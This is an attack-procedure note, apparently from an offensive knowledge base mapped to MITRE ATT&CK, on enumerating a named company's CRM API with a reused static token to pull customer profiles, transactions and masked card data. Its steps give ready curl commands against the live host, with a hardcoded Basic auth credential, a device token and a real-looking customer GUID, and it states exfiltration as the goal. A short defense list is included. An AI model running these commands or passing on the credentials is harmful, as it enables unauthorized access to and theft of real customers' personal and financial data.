---
id: proc-access-api-endpoints
tags:
  - api-enumeration
  - data-exfiltration
  - customer-data
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/get-customerprofiles]]'
  - '[[commands/get-customerprofile-guid]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:32:20.534Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Account Discovery]]'
---
# Access-API-Documentation-and-Sensitive-Endpoints

## Summary

This procedure uses the reused auth token to access API documentation and enumerate GET endpoints, exposing sensitive customer data like profiles, transactions, and masked credit cards.

## Description

With the static token, the entire API at crmproxy.protel.com.tr becomes accessible, including Swagger docs at /swagger/docs/v1/ listing endpoints like /customerprofiles and /customerprofile/{guid}, allowing unauthorized data collection.

## Requirements

1. Valid static auth token injected in browser or curl.
2. Access to https://crmproxy.protel.com.tr/.
3. GUIDs from enumeration for targeted queries.

## Defense

Defensive measures and detection strategies:

- Enforce proper authentication (e.g., JWT per user) on all endpoints.
- Hide or protect API documentation from unauthorized access.
- Implement data access logging and anomaly detection for bulk queries.

## Objectives

1. Locate and review API documentation.
2. Enumerate all customer data via GET methods.
3. Exfiltrate profiles, transactions, and tokens.

## Instructions

### Step 1: Access API Root and Docs

**Context**: Browse to the server root to find documentation links.

Navigate to https://crmproxy.protel.com.tr/ with token header.

> Links to /edgeapidoc/index/ and /swagger/docs/v1/ appear; review for all GET endpoints.

### Step 2: Enumerate Customer Profiles

**Context**: Fetch all profiles to obtain GUIDs for deeper access.

Execute [[commands/get-customerprofiles]] to list users.

```bash
curl -k -H "Authorization: Basic QVBSTlhXTFpUUTo4NGY0NDlmMWYzOWEyMDUz" -H "Accept: application/json" https://crmproxy.protel.com.tr/api/v1/customerprofiles
```

> Expected: JSON array with GUIDs and contact IDs.

### Step 3: Retrieve Specific Profile Data

**Context**: Use a GUID to access individual sensitive info.

Execute [[commands/get-customerprofile-guid]] with example GUID ae533ce1-0613-e611-80bf-00155d5b2b02.

```bash
curl -k -H "Authorization: Basic QVBSTlhXTFpUUTo4NGY0NDlmMWYzOWEyMDUz" -H "Device-Token: 337658ef1bf61f5c" https://crmproxy.protel.com.tr/api/v1/customerprofile/ae533ce1-0613-e611-80bf-00155d5b2b02
```

> Expected: Profile data including transactions and masked cards; or 409 error if invalid GUID.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[Account Discovery]] Account Discovery

### Sub-Techniques

- None

## Commands Used

- [[commands/get-customerprofiles]]
- [[commands/get-customerprofile-guid]]

## Tools Used

- None

## Tags

- api-enumeration
- data-exfiltration
